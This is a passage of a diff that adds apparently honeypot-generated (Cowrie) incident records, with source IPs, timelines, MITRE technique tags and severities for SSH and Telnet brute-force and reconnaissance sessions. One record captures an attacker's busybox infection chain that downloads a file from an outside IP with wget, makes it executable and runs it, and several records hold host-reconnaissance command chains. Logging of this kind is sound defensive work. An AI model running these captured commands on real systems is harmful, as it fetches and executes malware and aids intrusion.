+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:38:33.558141Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:33.754163Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:33.754814Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:34.681517Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.259042Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.259510Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.260158Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.260916Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.261607Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.521061Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:38:35.931778Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1bed71ea5726",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:39:24.599683Z",
+      "last_seen": "2026-03-11T17:39:27.056837Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:39:24.599683Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:24.824525Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:24.825315Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:25.957505Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.506455Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.506953Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.507533Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.508302Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.509031Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:26.764461Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:39:27.056837Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-d88ae97d741a",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:40:15.886014Z",
+      "last_seen": "2026-03-11T17:40:18.611820Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:40:15.886014Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:16.114995Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:16.115679Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.404001Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.938213Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.938680Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.939307Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.940019Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:17.940803Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:18.354870Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:40:18.611820Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-7cd141b48cab",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:41:05.342735Z",
+      "last_seen": "2026-03-11T17:41:07.943608Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; ",
+        "uname -s -v -n -m 2 > /dev/null",
+        "uname -m 2 > /dev/null",
+        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+      ],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1083",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:41:05.342735Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:05.610664Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:05.611346Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:06.843443Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.359382Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.359906Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.360542Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.361415Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.362096Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.731489Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T17:41:07.943608Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-7e9ddca96994",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:42:32.367548Z",
+      "last_seen": "2026-03-11T17:42:32.368539Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:42:32.367548Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:42:32.368539Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f783b00a3a12",
+      "src_ip": "167.71.230.119",
+      "first_seen": "2026-03-11T17:42:32.381440Z",
+      "last_seen": "2026-03-11T17:42:33.458218Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:42:32.381440Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:42:32.382171Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:42:32.396252Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:42:32.441916Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:42:33.458218Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-68f2b4d6536a",
+      "src_ip": "20.105.65.67",
+      "first_seen": "2026-03-11T17:44:41.352543Z",
+      "last_seen": "2026-03-11T17:44:42.098760Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:44:41.352543Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:44:41.353329Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:44:41.500961Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:44:41.949301Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:44:42.098760Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-8ee4d1ce8e4a",
+      "src_ip": "125.113.231.244",
+      "first_seen": "2026-03-11T17:50:16.695526Z",
+      "last_seen": "2026-03-11T17:50:29.281988Z",
+      "duration_seconds": 12,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:50:16.695526Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:50:29.281988Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-246ac9802171",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T17:53:07.393393Z",
+      "last_seen": "2026-03-11T17:53:08.636590Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:53:07.393393Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:53:07.394100Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:53:07.427574Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:53:07.601041Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:53:08.636590Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-0ce5727f6a2a",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T17:58:49.540799Z",
+      "last_seen": "2026-03-11T17:58:50.782249Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:58:49.540799Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:58:49.541457Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T17:58:49.575896Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T17:58:49.747172Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:58:50.782249Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-58ee91dd179d",
+      "src_ip": "176.221.111.222",
+      "first_seen": "2026-03-11T17:59:31.920830Z",
+      "last_seen": "2026-03-11T18:01:14.512929Z",
+      "duration_seconds": 102,
+      "login_attempts": 3,
+      "login_success": true,
+      "commands": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "cat /proc/mounts; /bin/busybox WRZBU",
+        "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WRZBU",
+        "tftp; wget; /bin/busybox WRZBU",
+        "dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s",
+        "/bin/busybox WRZBU",
+        "rm .s; wget http://5.181.28.63:5945/.i; chmod 777 .i; ./.i; exit"
+      ],
+      "downloads": [
+        {
+          "url": "http://5.181.28.63:5945/.i",
+          "sha256": "a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3"
+        }
+      ],
+      "ttps": [
+        "T1059.004",
+        "T1078",
+        "T1083",
+        "T1105",
+        "T1110.001"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T17:59:31.920830Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:32.247009Z",
+          "event": "cowrie.telnet.option"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:32.435213Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:32.730292Z",
+          "event": "cowrie.telnet.option"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:32.918133Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.213443Z",
+          "event": "cowrie.telnet.option"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.401221Z",
+          "event": "cowrie.login.success"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.481326Z",
+          "event": "cowrie.session.params"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.629614Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.631042Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.631604Z",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.632181Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.632669Z",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.633248Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.781874Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:33.933208Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:34.083128Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:34.234011Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:34.235862Z",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:34.384366Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:34.533852Z",
+          "event": "cowrie.command.input"
+        },
+        {
+          "timestamp": "2026-03-11T17:59:35.262661Z",
+          "event": "cowrie.session.file_download"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:14.508328Z",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:14.512929Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-db34187b5f7e",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:01:55.832635Z",
+      "last_seen": "2026-03-11T18:01:57.077657Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:01:55.832635Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:55.833505Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:55.866961Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:56.042013Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:01:57.077657Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-cb3784ff9c18",
+      "src_ip": "157.15.59.109",
+      "first_seen": "2026-03-11T18:04:24.670372Z",
+      "last_seen": "2026-03-11T18:04:25.912214Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:04:24.670372Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:04:24.671131Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:04:24.703955Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:04:24.877163Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:04:25.912214Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-ebb14849cf0d",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:06:43.057776Z",
+      "last_seen": "2026-03-11T18:06:44.302998Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:06:43.057776Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:06:43.058453Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:06:43.091735Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:06:43.267657Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:06:44.302998Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-337b796ed134",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:09:08.197206Z",
+      "last_seen": "2026-03-11T18:09:09.441837Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:09:08.197206Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:09:08.197911Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:09:08.231193Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:09:08.404150Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:09:09.441837Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f4ab7f55ec72",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:11:32.483816Z",
+      "last_seen": "2026-03-11T18:11:33.726433Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:11:32.483816Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:11:32.484478Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:11:32.517855Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:11:32.690786Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:11:33.726433Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f948b79d6f06",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:13:51.005989Z",
+      "last_seen": "2026-03-11T18:13:52.249753Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:13:51.005989Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:13:51.006746Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:13:51.040869Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:13:51.214180Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:13:52.249753Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-2013b6f66d5d",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:16:16.934485Z",
+      "last_seen": "2026-03-11T18:16:18.175236Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:16:16.934485Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:16:16.935241Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:16:16.968150Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:16:17.140167Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:16:18.175236Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-469cefb97e38",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:18:40.041189Z",
+      "last_seen": "2026-03-11T18:18:41.285517Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:18:40.041189Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:18:40.041883Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:18:40.075121Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:18:40.249834Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:18:41.285517Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-ae1884f4d745",
+      "src_ip": "157.15.59.120",
+      "first_seen": "2026-03-11T18:21:05.052635Z",
+      "last_seen": "2026-03-11T18:21:06.298807Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:21:05.052635Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:21:05.053482Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:21:05.090394Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:21:05.263090Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:21:06.298807Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-115a11aeb74c",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:25:28.056588Z",
+      "last_seen": "2026-03-11T18:25:28.071497Z",
+      "duration_seconds": 0,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:25:28.056588Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:25:28.071497Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-6c741c362405",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:27:40.957841Z",
+      "last_seen": "2026-03-11T18:27:42.033682Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:27:40.957841Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:27:40.958511Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:27:40.972865Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:27:41.017566Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:27:42.033682Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-735213d2b19d",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:28:04.027091Z",
+      "last_seen": "2026-03-11T18:28:05.106451Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:28:04.027091Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:04.027761Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:04.042120Z",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:04.087303Z",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:05.106451Z",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-b8cdcaa00c05",
+      "src_ip": "206.189.143.89",
+      "first_seen": "2026-03-11T18:28:26.647630Z",
+      "last_seen": "2026-03-11T18:28:27.726191Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "timestamp": "2026-03-11T18:28:26.647630Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:26.648381Z",
+          "event": "cowrie.client.version"
+        },
+        {
+          "timestamp": "2026-03-11T18:28:26.662868Z",
+          "event": "cowrie.client.kex"
+        },
